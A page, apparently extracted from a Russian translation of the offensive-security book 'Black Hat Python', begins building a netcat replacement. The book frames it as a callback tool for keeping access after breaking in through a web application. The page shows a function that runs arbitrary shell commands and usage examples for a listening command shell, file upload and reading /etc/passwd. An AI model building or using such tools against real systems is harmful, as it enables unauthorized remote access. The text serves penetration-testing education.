# Black Hat Python. Программирование для хакеров и пентестеров — страница 29

Источник: `Black Hat Python. Программирование для хакеров и пентестеров.pdf`

Замена netcat   29
к командной строке. Если вы пробрались внутрь через веб-приложение, вам
определенно стоит предусмотреть функцию обратного вызова на Python,
чтобы получить дополнительный доступ, не раскрывая один из своих тро-
янов или бэкдоров. К тому же создание такого инструмента будет хорошим
упражнением в программировании на Python, поэтому давайте приступим
к написанию netcat.py:
import argparse
import socket
import shlex
import subprocess
import sys
import textwrap
import threading
def execute(cmd):
    cmd = cmd.strip()
    if not cmd:
        return
    output = subprocess.check_output(shlex.split(cmd), 
                                     stderr=subprocess.STDOUT)
    return output.decode()
Здесь мы импортируем все нужные библиотеки и определяем функцию
execute, которая получает команду , выполняет ее и возвращает вывод в виде
строки. Эта функция использует новую библиотеку , которую мы еще не об-
суждали, — subprocess. Она предоставляет мощный интерфейс для создания
процессов, с помощью которого вы можете взаимодействовать с клиентскими
программами несколькими способами. В данном случае  мы используем ее
метод check_output, который выполняет команду в локальной операционной
системе и затем возвращает вывод этой команды.
Т еперь создадим главный блок, ответственный за разбор аргументов команд-
ной строки и вызов остальных наших функций:
if __name__ == '__main__':
    parser = argparse.ArgumentParser( 
        description='BHP Net Tool',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=textwrap.dedent('''Example: 
            netcat.py -t 192.168.1.108 -p 5555 -l -c # командная оболочка
            netcat.py -t 192.168.1.108 -p 5555 -l -u=mytest.txt
            # загружаем в файл
            netcat.py -t 192.168.1.108 -p 5555 -l -e=\"cat /etc/passwd\"
            # выполняем команду
